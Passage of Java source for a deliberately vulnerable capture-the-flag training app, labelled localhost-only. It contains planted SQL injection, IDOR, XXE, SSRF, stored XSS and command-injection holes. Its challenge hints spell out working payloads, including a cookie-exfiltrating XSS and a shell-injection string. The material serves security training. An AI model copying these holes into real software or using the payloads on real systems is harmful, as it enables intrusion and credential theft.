package lab;

import io.javalin.Javalin;
import io.javalin.http.Context;

import java.sql.*;
import java.util.*;

/**
 * SecDevSW Vulnerability Lab - "Helpdesk" challenge app (Java/Javalin).
 *
 * INTENTIONALLY VULNERABLE. Localhost only.
 *
 * Java port of apps/python/app.py: same challenge ids, flags and server-side
 * solve detection. Vulnerabilities live in normal features; the server
 * auto-detects each solve, flips it green on /scoreboard, and reveals the
 * flag + a remediation note.
 */
public class Main {
    static final String DB = "jdbc:sqlite:/tmp/helpdesk.db";

    // ----------------------------------------------------------------------- //
    // Challenge registry
    // ----------------------------------------------------------------------- //
    record Challenge(String id, String cat, String diff, String title, String goal,
                     List<String> hints, String flag, String fix) {}

    static final List<Challenge> CHALLENGES = List.of(
        new Challenge("sqli_login", "A05", "easy", "Authentication bypass",
            "Log in as admin without the password.",
            List.of("The login form builds a SQL query from your input.",
                    "Comment out the password check.",
                    "Username:  admin'--"),
            "FLAG{sqli_auth_bypass}",
            "Parameterise the query (PreparedStatement); never concatenate input into SQL."),
        new Challenge("idor", "A01", "easy", "Read the admin's ticket",
            "Read a ticket that belongs to the admin.",
            List.of("Tickets are at /ticket/<id> with sequential ids.",
                    "Nothing checks that the ticket is yours.",
                    "Walk the ids until you hit the admin's."),
            "FLAG{idor_broken_object_level_auth}",
            "Enforce an ownership check on every object access; deny by default."),
        new Challenge("forced_admin", "A01", "easy", "Forced browsing to admin",
            "Reach the admin panel as a normal user.",
            List.of("There's no admin link in your menu.",
                    "The route still exists.",
                    "Browse directly to /admin."),
            "FLAG{forced_browsing_missing_function_ac}",
            "Enforce function-level authorization server-side, not by hiding links."),
        new Challenge("error_disclosure", "A02", "easy", "Verbose error leak",
            "Make the printable-report feature leak an internal stack trace.",
            List.of("Every ticket has a 'Printable report' link -> /report?id=<n>.",
                    "The id is used without validation.",
                    "Give it a non-numeric id: /report?id=abc"),
            "FLAG{verbose_error_information_disclosure}",
            "Validate input; fail closed with a generic message; log details server-side."),
        new Challenge("crack_md5", "A04", "easy", "Crack a leaked hash",
            "On /storage, crack the leaked MD5 hash and submit the plaintext.",
            List.of("Unsalted MD5 of a common password.",
                    "Hash it against a small wordlist.",
                    "The plaintext is a very common password ending in 123."),
            "FLAG{weak_hash_cracked}",
            "Store passwords with Argon2id or PBKDF2 (salted, slow) - never MD5/SHA."),
        new Challenge("sqli_union", "A05", "medium", "Exfiltrate credentials",
            "Use ticket search to read the users table via UNION.",
            List.of("Search runs a LIKE query you can break out of.",
                    "users has columns (name, password).",
                    "' UNION SELECT name,password FROM users--"),
            "FLAG{sqli_union_based_exfiltration}",
            "Parameterise queries (PreparedStatement); least-privilege DB account."),
        new Challenge("privesc", "A01", "medium", "Privilege escalation",
            "Make your own account an administrator.",
            List.of("The profile form saves more fields than it shows.",
                    "The server trusts every field you submit (mass assignment).",
                    "POST role=admin to /profile."),
            "FLAG{mass_assignment_privilege_escalation}",
            "Bind only an allow-list of fields; never let the client set role."),
        new Challenge("xxe", "A05", "medium", "XXE file disclosure",
            "Import a ticket via XML and read a server-side file.",
            List.of("/ticket/import parses XML with external entities enabled.",
                    "Define a DOCTYPE entity pointing at a file:// URL.",
                    "<!DOCTYPE t [<!ENTITY x SYSTEM \"file://" + "/tmp/xxe_secret.txt"
                        + "\">]> and use &x; in <title>."),
            "FLAG{xxe_file_disclosure}",
            "Disable DTDs/external entities (disallow-doctype-decl); prefer JSON."),
        new Challenge("ssrf", "A01", "medium", "SSRF via avatar fetch",
            "Make the server fetch an internal-only resource.",
            List.of("Profile fetches an avatar from a URL you give it.",
                    "The server can reach things you can't (cloud metadata).",
                    "avatar URL = http://127.0.0.1:7000/internal/metadata"),
            "FLAG{ssrf_internal_metadata_access}",
            "Allow-list outbound hosts; block loopback/link-local; use a fetch broker."),
        new Challenge("xss_stored", "A05", "medium", "Steal the admin's cookie",
            "Store a comment that exfiltrates the admin's cookie to your collector.",
            List.of("Comments render unescaped; an admin bot views new comments every 2s.",
                    "A pop-up proves nothing - you must exfiltrate document.cookie.",
                    "<img src=x onerror=\"new Image().src='http://localhost:7000/collector?c='+document.cookie\">,"
                        + " then read /collector/log."),
            "FLAG{stored_xss_admin_session_theft}",
            "Context-aware output encoding on render; strict CSP; HttpOnly cookies."),
        new Challenge("cmdi", "A05", "hard", "Command injection",
            "Run an OS command via the admin diagnostics tool.",
            List.of("Admin diagnostics pings a host you supply (needs admin).",
                    "The host goes into a shell unquoted.",
                    "host = 127.0.0.1; cat " + "/tmp/ctf_root.txt"),
            "FLAG{os_command_injection_rce}",
            "No shell; pass an argument vector (ProcessBuilder list); allow-list the input.")
    );

    static final String XXE_SECRET_FILE = "/tmp/xxe_secret.txt";
    static final String CMDI_FLAG_FILE = "/tmp/ctf_root.txt";
    static final String ADMIN_COOKIE = "FLAG{stored_xss_admin_session_theft}";   // the loot the XSS must steal

    static final List<String> CRACK_WORDLIST = List.of("password", "123456", "password123", "letmein",
        "qwerty", "admin", "secret", "hunter2", "welcome", "dragon");
    static final String CRACK_TARGET = hexDigest("MD5", "password123");   // the crack_md5 challenge

    // ----------------------------------------------------------------------- //
    // DB helpers + solve engine
    // ----------------------------------------------------------------------- //
    static Connection conn() throws SQLException {
        return DriverManager.getConnection(DB);
    }

    static List<Map<String, Object>> rows(ResultSet rs) throws SQLException {
        List<Map<String, Object>> out = new ArrayList<>();
        ResultSetMetaData md = rs.getMetaData();
        while (rs.next()) {
            Map<String, Object> m = new LinkedHashMap<>();
            for (int i = 1; i <= md.getColumnCount(); i++) m.put(md.getColumnLabel(i), rs.getObject(i));
            out.add(m);
        }
        return out;
    }

    /** Parameterised query (safe). */
    static List<Map<String, Object>> query(String sql, Object... p) throws SQLException {
        try (Connection c = conn(); PreparedStatement ps = c.prepareStatement(sql)) {
            for (int i = 0; i < p.length; i++) ps.setObject(i + 1, p[i]);
            try (ResultSet rs = ps.executeQuery()) { return rows(rs); }
        }
    }

    static Map<String, Object> one(String sql, Object... p) throws SQLException {
        List<Map<String, Object>> r = query(sql, p);
        return r.isEmpty() ? null : r.get(0);
    }

    static int exec(String sql, Object... p) throws SQLException {
        try (Connection c = conn(); PreparedStatement ps = c.prepareStatement(sql)) {
            for (int i = 0; i < p.length; i++) ps.setObject(i + 1, p[i]);
            return ps.executeUpdate();
        }
    }

    /** Raw SQL string, no binding. Used by the deliberately vulnerable features. */
    static List<Map<String, Object>> rawQuery(String sql) throws SQLException {
        try (Connection c = conn(); Statement st = c.createStatement(); ResultSet rs = st.executeQuery(sql)) {
            return rows(rs);
        }
    }

    static double now() { return System.currentTimeMillis() / 1000.0; }

    static void solve(String cid) {
        try {
            exec("INSERT OR IGNORE INTO solved(cid, ts) VALUES (?,?)", cid, now());
        } catch (SQLException e) {
            System.err.println("solve(" + cid + ") failed: " + e.getMessage());
        }
    }

    static Set<String> solvedIds() throws SQLException {
        Set<String> s = new HashSet<>();
        for (var r : query("SELECT cid FROM solved")) s.add((String) r.get("cid"));
        return s;
    }

    static void seed() throws SQLException {
        String[] ddl = {
            "DROP TABLE IF EXISTS users", "DROP TABLE IF EXISTS tickets",
            "DROP TABLE IF EXISTS comments", "DROP TABLE IF EXISTS solved",
            "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT UNIQUE, password TEXT, role TEXT)",
            "CREATE TABLE tickets (id INTEGER PRIMARY KEY, owner TEXT, title TEXT, body TEXT)",
            "CREATE TABLE comments (id INTEGER PRIMARY KEY, ticket_id INT, author TEXT, body TEXT, seen INT DEFAULT 0)",
            "CREATE TABLE solved (cid TEXT PRIMARY KEY, ts REAL)",
            "DROP TABLE IF EXISTS collector",
            "CREATE TABLE collector (id INTEGER PRIMARY KEY, ts REAL, data TEXT)",
            "INSERT INTO users(name,password,role) VALUES "
              + "('admin','S3cr3t-R00t-P@ss','admin'),('alice','alicepw','user'),('bob','bobpw','user')",
            "INSERT INTO tickets(owner,title,body) VALUES "
              + "('alice','VPN down','Cannot connect from home.'),"
              + "('bob','Printer jam','3rd floor printer offline.'),"
              + "('admin','Recovery codes','Internal only - do not share.')",
        };
        try (Connection c = conn(); Statement st = c.createStatement()) {
            for (String s : ddl) st.executeUpdate(s);
        }
        try {
            java.nio.file.Files.writeString(java.nio.file.Path.of(XXE_SECRET_FILE), "FLAG{xxe_file_disclosure}\n");
            java.nio.file.Files.writeString(java.nio.file.Path.of(CMDI_FLAG_FILE), "FLAG{os_command_injection_rce}\n");
        } catch (java.io.IOException e) {
            throw new IllegalStateException("cannot write loot files", e);
        }
    }

    // ----------------------------------------------------------------------- //
    // Admin review bot: stored XSS must EXFILTRATE the admin cookie (not just alert)
    // ----------------------------------------------------------------------- //
    static final java.util.regex.Pattern URL_RE = java.util.regex.Pattern.compile("https?://[^\\s'\"<>()]+");

    static void adminBot() {
        List<String> sinks = List.of("<script", "onerror", "onload", "<svg", "<img");
        var http = java.net.http.HttpClient.newBuilder().connectTimeout(java.time.Duration.ofSeconds(3)).build();
        while (true) {
            try {
                for (var row : query("SELECT * FROM comments WHERE seen=0")) {
                    String body = row.get("body") == null ? "" : row.get("body").toString();
                    String low = body.toLowerCase(Locale.ROOT);
                    boolean fired = sinks.stream().anyMatch(low::contains);
                    boolean exfil = low.contains("document.cookie");
                    var m = URL_RE.matcher(body);
                    if (fired && exfil && m.find()) {
                        // the admin's browser "runs" the payload: the cookie leaves to the URL.
                        String target = m.group().split("\\?")[0].replaceAll("[+'\" )]+$", "");
                        try {
                            http.send(java.net.http.HttpRequest.newBuilder(java.net.URI.create(target + "?c="
                                    + java.net.URLEncoder.encode(ADMIN_COOKIE, java.nio.charset.StandardCharsets.UTF_8)))
                                    .timeout(java.time.Duration.ofSeconds(3)).build(),
                                java.net.http.HttpResponse.BodyHandlers.discarding());
                        } catch (Exception ignored) { }
                        solve("xss_stored");
                    }
                    exec("UPDATE comments SET seen=1 WHERE id=?", row.get("id"));
                }
            } catch (Exception e) {
                System.err.println("admin bot: " + e.getMessage());
            }
            try { Thread.sleep(2000); } catch (InterruptedException e) { return; }
        }
    }

    // ----------------------------------------------------------------------- //
    // Hashing (credential-storage hands-on)
    // ----------------------------------------------------------------------- //
    static String hex(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02x", x));
        return sb.toString();
    }

    static String hexDigest(String alg, String s) {
        try {
            return hex(java.security.MessageDigest.getInstance(alg)
                       .digest(s.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
        } catch (java.security.NoSuchAlgorithmException e) {
            throw new IllegalStateException(e);
        }
    }

    static String hashScheme(String scheme, String pw) throws Exception {
        switch (scheme) {
            case "cleartext": return pw;
            case "md5":       return hexDigest("MD5", pw);
            case "sha256":    return hexDigest("SHA-256", pw);
            case "pbkdf2": {
                var spec = new javax.crypto.spec.PBEKeySpec(pw.toCharArray(),
                        "per-user-salt".getBytes(java.nio.charset.StandardCharsets.UTF_8), 200000, 256);
                return hex(javax.crypto.SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
                           .generateSecret(spec).getEncoded());
            }
            case "argon2id": {
                // Same parameters as argon2-cffi's defaults (t=3, m=64MiB, p=4), PHC string format.
                byte[] salt = new byte[16];
                new java.security.SecureRandom().nextBytes(salt);
                var params = new org.bouncycastle.crypto.params.Argon2Parameters.Builder(
                        org.bouncycastle.crypto.params.Argon2Parameters.ARGON2_id)
                        .withVersion(org.bouncycastle.crypto.params.Argon2Parameters.ARGON2_VERSION_13)
                        .withIterations(3).withMemoryAsKB(65536).withParallelism(4).withSalt(salt).build();
                var gen = new org.bouncycastle.crypto.generators.Argon2BytesGenerator();
                gen.init(params);
                byte[] out = new byte[32];
                gen.generateBytes(pw.getBytes(java.nio.charset.StandardCharsets.UTF_8), out);
                var b64 = Base64.getEncoder().withoutPadding();
                return "$argon2id$v=19$m=65536,t=3,p=4$" + b64.encodeToString(salt) + "$" + b64.encodeToString(out);
            }
            default: return "?";
        }
    }

    static String crack(String hv) {
        for (String w : CRACK_WORDLIST)
            if (hexDigest("MD5", w).equals(hv) || hexDigest("SHA-256", w).equals(hv)) return w;
        return null;
    }

    /** Honest teaching verdict per scheme: {pill-class, label}. */
    static String[] verdict(String scheme, String hv) {
        switch (scheme) {
            case "cleartext": return new String[]{"no", "Plaintext - fully exposed"};
            case "md5": case "sha256": {
                String w = crack(hv);
                return w != null ? new String[]{"no", "Cracked: " + w}
                                 : new String[]{"warn", "Fast hash - crackable offline"};
            }
            case "pbkdf2":   return new String[]{"ok", "Salted + slow (200k) - resistant"};
            case "argon2id": return new String[]{"ok", "Memory-hard - resistant"};
            default:         return new String[]{"warn", "?"};
        }
    }

    // ----------------------------------------------------------------------- //
    // Session helpers
    // ----------------------------------------------------------------------- //
    static Map<String, Object> current(Context ctx) throws SQLException {
        Integer uid = ctx.sessionAttribute("uid");
        if (uid == null) return null;
        return one("SELECT * FROM users WHERE id=?", uid);
    }

    /** Returns the logged-in user, or redirects to /login and returns null. */
    static Map<String, Object> requireUser(Context ctx) throws SQLException {
        var u = current(ctx);
        if (u == null) ctx.redirect("/login");
        return u;
    }

    static String param(String v) { return v == null ? "" : v; }

    /** Text of the first direct child element with this tag (like lxml findtext), or "". */
    static String childText(org.w3c.dom.Element root, String tag) {
        for (var n = root.getFirstChild(); n != null; n = n.getNextSibling()) {
            if (n instanceof org.w3c.dom.Element el && el.getTagName().equals(tag)) return el.getTextContent();
        }
        return "";
    }

    // ----------------------------------------------------------------------- //
    // UI
    // ----------------------------------------------------------------------- //
    static final String CSS = """
        :root{color-scheme:light dark;--bg:#f6f7f9;--fg:#1a1d21;--card:#fff;--line:#e3e6ea;
        --brand:#2b6cb0;--muted:#6b7280;--ok:#15803d;--okbg:#dcfce7;--no:#b91c1c;--nobg:#fee2e2;--chip:#eef2f7}
        @media(prefers-color-scheme:dark){:root{--bg:#0f1216;--fg:#e6e8eb;--card:#171b21;--line:#2a2f37;
        --brand:#5aa2e0;--muted:#9aa4b2;--okbg:#0f2e1c;--nobg:#2e1414;--chip:#1e242c}}
        *{box-sizing:border-box}body{margin:0;font:15px/1.6 system-ui,sans-serif;background:var(--bg);color:var(--fg)}
        nav{background:var(--card);border-bottom:1px solid var(--line);padding:.6rem 1rem;display:flex;
        gap:.2rem;align-items:center;flex-wrap:wrap;position:sticky;top:0}
        nav .brand{font-weight:700;margin-right:1rem;color:var(--brand)}
        nav a{color:var(--fg);text-decoration:none;padding:.35rem .6rem;border-radius:6px}
        nav a:hover{background:var(--chip)}nav .sp{margin-left:auto}nav .u{color:var(--muted);font-size:.9rem}
        main{max-width:52rem;margin:1.5rem auto;padding:0 1rem}
        .card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:1rem 1.2rem;margin:1rem 0}
        h1,h2,h3{line-height:1.25}h2{margin-top:0}
        a{color:var(--brand)}code,pre{background:var(--chip);border-radius:5px}
        code{padding:.08em .35em}pre{padding:.7rem;overflow:auto}
        input,textarea,select{font:inherit;padding:.5rem;width:100%;background:var(--card);color:var(--fg);
        border:1px solid var(--line);border-radius:7px}label{font-size:.85rem;color:var(--muted)}
        button,.btn{font:inherit;font-weight:600;padding:.5rem .9rem;border:0;border-radius:7px;
        background:var(--brand);color:#fff;cursor:pointer}
        table{border-collapse:collapse;width:100%}th,td{border:1px solid var(--line);padding:.45rem .6rem;text-align:left}
        th{background:var(--chip)}.warn{color:var(--no);font-weight:600}
        .pill{display:inline-block;padding:.1rem .5rem;border-radius:999px;font-size:.8rem;font-weight:600}
        .pill.ok{background:var(--okbg);color:var(--ok)}.pill.no{background:var(--nobg);color:var(--no)}
        .pill.warn{background:#fde68a;color:#92400e}td code{word-break:break-all;white-space:normal}
        table.fixed{table-layout:fixed}table.fixed td:nth-child(2){width:60%}
        .flag{color:var(--ok);font-weight:700}.muted{color:var(--muted)}.grid{display:grid;gap:.6rem}
        tr.ok{background:var(--okbg)}.row{display:flex;gap:.5rem;align-items:center}
        """;

    /** HTML-escape for output encoding. */
    static String h(Object o) {
        if (o == null) return "";
        return o.toString().replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;").replace("'", "&#x27;");
    }

    static String layout(Map<String, Object> user, String body) {
        StringBuilder nav = new StringBuilder("<nav><span class=brand>&#128737; Helpdesk</span>"
            + "<a href=\"/\">Home</a><a href=\"/tickets\">Tickets</a><a href=\"/storage\">Storage</a>"
            + "<a href=\"/collector/log\">Collector</a><a href=\"/scoreboard\">Scoreboard</a>");
        if (user != null) {
            if ("admin".equals(user.get("role"))) nav.append("<a href=\"/admin\">Admin</a>");
            nav.append("<span class=\"sp u\">").append(h(user.get("name"))).append(" &middot; ")
               .append(h(user.get("role"))).append(" &middot; <a href=\"/logout\">logout</a></span>");
        } else {
            nav.append("<span class=sp><a href=\"/login\">login</a> <a href=\"/register\">register</a></span>");
        }
        nav.append("</nav>");
        return "<!doctype html><html lang=en><meta charset=utf-8>"
            + "<meta name=viewport content=\"width=device-width,initial-scale=1\"><title>Helpdesk</title>"
            + "<style>" + CSS + "</style>" + nav + "<main>" + body + "</main></html>";
    }

    static void page(Context ctx, String body) throws SQLException {
        ctx.html(layout(current(ctx), body));
    }

    // ----------------------------------------------------------------------- //
    // Routes
    // ----------------------------------------------------------------------- //
    public static void main(String[] args) throws Exception {
        seed();
        Javalin app = Javalin.create();

        // ---- auth ---------------------------------------------------------- //
        app.get("/login", ctx -> page(ctx, """
            <div class=card><h2>Sign in</h2><form method=post class=grid>
            <div><label>Username</label><input name=username autofocus></div>
            <div><label>Password</label><input name=password type=password></div>
            <div><button>Sign in</button></div></form>
            <p class=muted>Demo users: alice / alicepw, bob / bobpw</p></div>"""));

        app.post("/login", ctx -> {
            String u = param(ctx.formParam("username"));
            String p = param(ctx.formParam("password"));
            // VULN (A05): username + password concatenated straight into SQL.
            String q = "SELECT * FROM users WHERE name = '" + u + "' AND password = '" + p + "'";
            List<Map<String, Object>> found;
            try {
                found = rawQuery(q);
            } catch (SQLException e) {
                page(ctx, "<div class=card><p class=warn>SQL error: " + h(e.getMessage())
                        + "</p><a href=/login>back</a></div>");
                return;
            }
            if (!found.isEmpty()) {
                var row = found.get(0);
                ctx.sessionAttribute("uid", ((Number) row.get("id")).intValue());
                String real = (String) one("SELECT password FROM users WHERE name='admin'").get("password");
                if ("admin".equals(row.get("name")) && !p.equals(real)) {   // got in without the password
                    solve("sqli_login");
                }
                ctx.redirect("/");
                return;
            }
            page(ctx, "<div class=card><p class=warn>Invalid credentials.</p><a href=/login>back</a></div>");
        });

        app.get("/register", ctx -> page(ctx, """
            <div class=card><h2>Register</h2><form method=post class=grid>
            <div><label>Username</label><input name=username></div>
            <div><label>Password</label><input name=password type=password></div>
            <div><button>Create account</button></div></form></div>"""));

        app.post("/register", ctx -> {
            try {
                exec("INSERT INTO users(name,password,role) VALUES(?,?,'user')",
                     param(ctx.formParam("username")), param(ctx.formParam("password")));
            } catch (SQLException e) {
                page(ctx, "<div class=card><p class=warn>name taken</p></div>");
                return;
            }
            ctx.redirect("/login");
        });

        app.get("/logout", ctx -> {
            ctx.req().getSession().invalidate();
            ctx.redirect("/");
        });

        app.get("/", ctx -> {
            var u = current(ctx);
            page(ctx, "<div class=card><h2>Internal Helpdesk</h2>"
                + "<p>Welcome" + (u != null ? ", " + h(u.get("name")) : "") + ". Raise and track support tickets.</p>"
                + "<p class=muted>Deliberately vulnerable training app &mdash; localhost only. "
                + "You've solved " + solvedIds().size() + " / " + CHALLENGES.size() + " challenges. "
                + "Start at the <a href=/scoreboard>scoreboard</a>.</p></div>");
        });

        // ---- tickets: IDOR, stored-XSS surface ----------------------------- //
        app.get("/tickets", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            StringBuilder li = new StringBuilder();
            for (var t : query("SELECT * FROM tickets WHERE owner=?", u.get("name"))) {
                li.append("<li><a href=\"/ticket/").append(t.get("id")).append("\">#").append(t.get("id"))
                  .append(" ").append(h(t.get("title"))).append("</a></li>");
            }
            page(ctx, "<div class=card><h2>Your tickets</h2>"
                + "<p class=row><a class=btn href=/ticket/new>+ New ticket</a>"
                + "<a class=btn href=/ticket/import style=background:#555>Import XML</a>"
                + "<form action=/search style=\"flex:1;display:flex;gap:.5rem\">"
                + "<input name=q placeholder=\"search tickets\"><button>Search</button></form></p>"
                + "<ul>" + li + "</ul></div>");
        });

        app.get("/ticket/new", ctx -> {
            if (requireUser(ctx) == null) return;
            page(ctx, """
                <div class=card><h2>New ticket</h2><form method=post class=grid>
                <div><label>Title</label><input name=title></div>
                <div><label>Body</label><textarea name=body rows=4></textarea></div>
                <div><button>Create</button></div></form></div>""");
        });

        app.post("/ticket/new", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            exec("INSERT INTO tickets(owner,title,body) VALUES(?,?,?)",
                 u.get("name"), param(ctx.formParam("title")), param(ctx.formParam("body")));
            ctx.redirect("/tickets");
        });

        app.get("/ticket/{id}", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            int tid;
            try { tid = Integer.parseInt(ctx.pathParam("id")); }
            catch (NumberFormatException e) { ctx.status(404).result("Not Found"); return; }
            var t = one("SELECT * FROM tickets WHERE id=?", tid);
            if (t == null) { page(ctx, "<div class=card><p>not found</p></div>"); return; }
            // VULN (A01 IDOR): no ownership check on object access.
            if (!Objects.equals(t.get("owner"), u.get("name"))) {
                solve("idor");
            }
            StringBuilder cm = new StringBuilder();
            for (var c : query("SELECT * FROM comments WHERE ticket_id=?", tid)) {
                // VULN (A05 stored XSS): comment body rendered without output encoding.
                cm.append("<p><b>").append(h(c.get("author"))).append(":</b> ").append(c.get("body")).append("</p>");
            }
            page(ctx, "<div class=card><h2>#" + t.get("id") + " " + h(t.get("title")) + "</h2>"
                + "<p class=muted>owner: " + h(t.get("owner")) + " &middot; "
                + "<a href=\"/report?id=" + t.get("id") + "\">Printable report</a></p>"
                + "<p>" + h(t.get("body")) + "</p><h3>Comments</h3>" + cm
                + "<form method=post action=\"/ticket/" + t.get("id") + "/comment\" class=grid>"
                + "<textarea name=body rows=2 placeholder=\"add a comment\"></textarea>"
                + "<div><button>Comment</button></div></form></div>");
        });

        app.post("/ticket/{id}/comment", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            int tid;
            try { tid = Integer.parseInt(ctx.pathParam("id")); }
            catch (NumberFormatException e) { ctx.status(404).result("Not Found"); return; }
            exec("INSERT INTO comments(ticket_id,author,body) VALUES(?,?,?)",
                 tid, u.get("name"), param(ctx.formParam("body")));
            ctx.redirect("/ticket/" + tid);
        });

        // ---- ticket import: XXE -------------------------------------------- //
        io.javalin.http.Handler ticketImport = ctx -> {
            if (requireUser(ctx) == null) return;
            String result = null;
            String xml = ctx.formParam("xml");
            if (xml != null) {
                try {
                    // VULN (A05 XXE): JDK default parser - DTDs and external entities are enabled.
                    var dbf = javax.xml.parsers.DocumentBuilderFactory.newInstance();
                    var builder = dbf.newDocumentBuilder();
                    // Like Python's no_network=True: local file:// entities only, no outbound HTTP.
                    builder.setEntityResolver((publicId, systemId) -> {
                        if (systemId != null && !systemId.startsWith("file:"))
                            throw new org.xml.sax.SAXException("network entities disabled: " + systemId);
                        return null;
                    });
                    var doc = builder.parse(new org.xml.sax.InputSource(new java.io.StringReader(xml)));
                    String title = childText(doc.getDocumentElement(), "title");
                    String body = childText(doc.getDocumentElement(), "body");
                    result = "{'title': '" + title + "', 'body': '" + body + "'}";
                    if ((title + body).contains("FLAG{xxe_file_disclosure}")) solve("xxe");
                } catch (Exception e) {
                    result = "{'error': '" + e.getMessage() + "'}";
                }
            }
            String sample = "<?xml version=\"1.0\"?>\n<ticket><title>Hello</title><body>from XML</body></ticket>";
            page(ctx, "<div class=card><h2>Import ticket from XML</h2>"
                + "<form method=post class=grid><textarea name=xml rows=6>" + h(sample) + "</textarea>"
                + "<div><button>Import</button></div></form>"
                + (result == null ? "" : "<h3>Parsed</h3><pre>" + h(result) + "</pre>") + "</div>");
        };
        app.get("/ticket/import", ticketImport);
        app.post("/ticket/import", ticketImport);

        // ---- profile: mass-assignment privesc, SSRF ------------------------ //
        app.get("/profile", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            page(ctx, "<div class=card><h2>Profile: " + h(u.get("name")) + "</h2>"
                + "<p>Role: <b>" + h(u.get("role")) + "</b></p>"
                + "<form method=post class=grid><div><label>New password</label><input name=password></div>"
                + "<div><button>Save</button></div></form></div>"
                + "<div class=card><h3>Avatar by URL</h3>"
                + "<form action=/profile/avatar class=grid><input name=url placeholder=http://...>"
                + "<div><button>Fetch</button></div></form></div>");
        });

        app.post("/profile", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            // VULN (A01 privesc): every submitted field is written (mass assignment).
            Map<String, String> fields = new LinkedHashMap<>();
            for (String k : List.of("password", "role")) {
                String v = ctx.formParam(k);
                if (v != null) fields.put(k, v);
            }
            for (var e : fields.entrySet()) {
                exec("UPDATE users SET " + e.getKey() + "=? WHERE id=?", e.getValue(), u.get("id"));
            }
            if ("admin".equals(fields.get("role")) && !"admin".equals(u.get("role"))) {
                solve("privesc");
            }
            ctx.redirect("/profile");
        });

        app.get("/profile/avatar", ctx -> {
            if (requireUser(ctx) == null) return;
            String url = param(ctx.queryParam("url"));
            String host = url.contains("://") && url.split("/").length > 2 ? url.split("/")[2] : "";
            // VULN (A01 SSRF): server fetches an arbitrary user-supplied URL.
            for (String bad : List.of("127.0.0.1", "localhost", "169.254.169.254", "0.0.0.0")) {
                if (host.contains(bad)) { solve("ssrf"); break; }
            }
            String data;
            try {
                var conn = new java.net.URI(url).toURL().openConnection();
                conn.setConnectTimeout(3000);
                conn.setReadTimeout(3000);
                try (var in = conn.getInputStream()) {
                    data = new String(in.readNBytes(2000), java.nio.charset.StandardCharsets.UTF_8);
                }
            } catch (Exception e) {
                data = "fetch error: " + e;
            }
            page(ctx, "<div class=card><h2>Fetched</h2><pre>" + h(data) + "</pre></div>");
        });

        // "Cloud metadata": only answers loopback callers, so the flag really requires SSRF
        // (a trainee's browser reaches the container from the Docker gateway, not loopback).
        app.get("/internal/metadata", ctx -> {
            if (!java.net.InetAddress.getByName(ctx.req().getRemoteAddr()).isLoopbackAddress()) {
                ctx.status(403).result("forbidden: internal endpoint\n");
                return;
            }
            ctx.contentType("text/plain")
               .result("instance-role: admin\nrecovery-code: FLAG{ssrf_internal_metadata_access}\n");
        });

        // ---- report: verbose error disclosure ------------------------------ //
        app.get("/report", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            String rid = ctx.queryParam("id") == null ? "1" : ctx.queryParam("id");
            String secretConfig = "DB_PASS=S3cr3t-R00t-P@ss";            // pretend config in scope
            // VULN (A02/A10): input used without validation; stack trace shown to the client.
            try {
                int n = Integer.parseInt(rid);
                var t = one("SELECT * FROM tickets WHERE id=?", n);
                // ownership check: a report is not a backdoor to other people's tickets.
                if (t != null && !Objects.equals(t.get("owner"), u.get("name")) && !"admin".equals(u.get("role"))) {
                    ctx.status(403);
                    page(ctx, "<div class=card><p class=warn>403 - not your ticket.</p></div>");
                    return;
                }
                page(ctx, "<div class=card><h2>Report #" + n + "</h2><pre>" + h(t == null ? "{}" : t) + "</pre></div>");
            } catch (NumberFormatException e) {
                solve("error_disclosure");
                java.io.StringWriter sw = new java.io.StringWriter();
                e.printStackTrace(new java.io.PrintWriter(sw));
                String tb = sw + "\nlocals: " + secretConfig;
                ctx.status(500);
                page(ctx, "<div class=card><h2 class=warn>Unhandled error</h2><pre>" + h(tb) + "</pre></div>");
            }
        });

        // ---- search: UNION-based SQLi -------------------------------------- //
        app.get("/search", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            String q = param(ctx.queryParam("q"));
            // VULN (A05 SQLi): LIKE query built by concatenation; UNION-able.
            String sql = "SELECT title, body FROM tickets WHERE title LIKE '%" + q + "%'";
            List<Map<String, Object>> found;
            try {
                found = rawQuery(sql);
            } catch (SQLException e) {
                page(ctx, "<div class=card><p class=warn>SQL error: " + h(e.getMessage()) + "</p></div>");
                return;
            }
            // Solve only if a result cell IS another user's password (i.e. creds were exfiltrated),
            // not merely a substring match - so registering a weak password can't fake it.
            Set<String> others = new HashSet<>();
            for (var r : query("SELECT password FROM users WHERE id<>?", u.get("id"))) others.add((String) r.get("password"));
            StringBuilder tr = new StringBuilder();
            boolean leaked = false;
            for (var r : found) {
                tr.append("<tr>");
                for (Object v : r.values()) {
                    if (v != null && others.contains(v.toString())) leaked = true;
                    tr.append("<td>").append(h(v)).append("</td>");
                }
                tr.append("</tr>");
            }
            if (leaked) solve("sqli_union");
            page(ctx, "<div class=card><h2>Search</h2><p><code>" + h(sql) + "</code></p>"
                + "<table><tr><th>col1</th><th>col2</th></tr>" + tr + "</table></div>");
        });

        // ---- credential storage hands-on (A04) + crack challenge ----------- //
        io.javalin.http.Handler storage = ctx -> {
            String pw = ctx.formParam("pw") == null ? "password" : ctx.formParam("pw");
            StringBuilder tr = new StringBuilder();
            for (String s : List.of("cleartext", "md5", "sha256", "pbkdf2", "argon2id")) {
                String hv = hashScheme(s, pw);
                String[] v = verdict(s, hv);
                tr.append("<tr><td>").append(s).append("</td><td><code>").append(h(hv)).append("</code></td>")
                  .append("<td><span class=\"pill ").append(v[0]).append("\">").append(h(v[1])).append("</span></td></tr>");
            }
            String submitted = ctx.formParam("plain");
            boolean crackedOk = submitted != null && hexDigest("MD5", submitted).equals(CRACK_TARGET);
            if (crackedOk) solve("crack_md5");
            String result = submitted == null ? ""
                : crackedOk ? "<p class=flag>Correct - FLAG{weak_hash_cracked}</p>"   // loot only via the crack
                            : "<p class=warn>nope, keep trying</p>";
            page(ctx, "<div class=card><h2>Credential storage</h2>"
                + "<p class=muted>Enter a password and see how each scheme would store it, with an "
